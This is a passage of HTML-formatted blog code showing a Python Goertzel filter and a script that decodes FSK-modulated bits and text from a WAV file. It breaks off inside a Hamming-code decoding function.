class=&#34;params&#34;&gt;self, samples&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        Goertzel filter equation&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        :param samples: array of samples&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        :returns: amplitude&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        y = self.normalize * &lt;span class=&#34;number&#34;&gt;160&lt;/span&gt; * np.dot(self.coeffs, samples)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ampl = np.&lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ampl&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# decode.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Decode a wav file using a Goertzel filter.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Modified from https://github.com/laurenschneider/audiodecoder&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; goertzel &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Goertzel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; numpy &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; np&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; scipy.io &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; wavfile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DATA = os.path.dirname(os.path.abspath(__file__))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;filepath = os.path.join(DATA, &lt;span class=&#34;string&#34;&gt;&amp;quot;filename.wav&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Read sample rate and data from audio file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rate, data = wavfile.read(filepath)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;message = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bit_string = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_freq = &lt;span class=&#34;number&#34;&gt;2225&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_freq = &lt;span class=&#34;number&#34;&gt;2025&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_filter = Goertzel(rate, mark_freq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_filter = Goertzel(rate, space_freq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# calculate coefficients for each filter&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_filter.calculate_coeff()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_filter.calculate_coeff()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(data.size + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# for each chunk of 160 samples&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i%&lt;span class=&#34;number&#34;&gt;160&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; i != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start = i - &lt;span class=&#34;number&#34;&gt;160&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        samples = data[start:end]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# get amplitutes of sample set&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mark_amp = mark_filter.&lt;span class=&#34;built_in&#34;&gt;filter&lt;/span&gt;(samples)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        space_amp = space_filter.&lt;span class=&#34;built_in&#34;&gt;filter&lt;/span&gt;(samples)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mark_amp &amp;gt; space_amp:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# bit is 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            to_add = &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# bit is zero&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            to_add = &lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bit_string = to_add + bit_string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(bit_string)+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x%&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start = x - &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end = x - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        message = &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(bit_string[start:end],&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)) + message&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(message)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# set target frequencies&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_freq = &lt;span class=&#34;number&#34;&gt;1270&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_freq = &lt;span class=&#34;number&#34;&gt;1070&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# create two filters&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_filter = Goertzel(rate, mark_freq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_filter = Goertzel(rate, space_freq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# calculate coefficients for each filter&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mark_filter.calculate_coeff()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space_filter.calculate_coeff()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bit_string = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;message = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(data.size + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# for each chunk of 160 samples&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i%&lt;span class=&#34;number&#34;&gt;160&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; i != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start = i - &lt;span class=&#34;number&#34;&gt;160&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        samples = data[start:end]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# get amplitutes of sample set&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mark_amp = mark_filter.&lt;span class=&#34;built_in&#34;&gt;filter&lt;/span&gt;(samples)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        space_amp = space_filter.&lt;span class=&#34;built_in&#34;&gt;filter&lt;/span&gt;(samples)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mark_amp &amp;gt; space_amp:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            to_add = &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            to_add = &lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bit_string = to_add + bit_string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;HammingBolck&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;message&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;assert&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(message)==&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    message=message[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    m_pos = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ind &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ind+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;amp;(ind): &lt;span class=&#34;comment&#34;&gt;# Not parity check bit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(message[m_pos],&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span 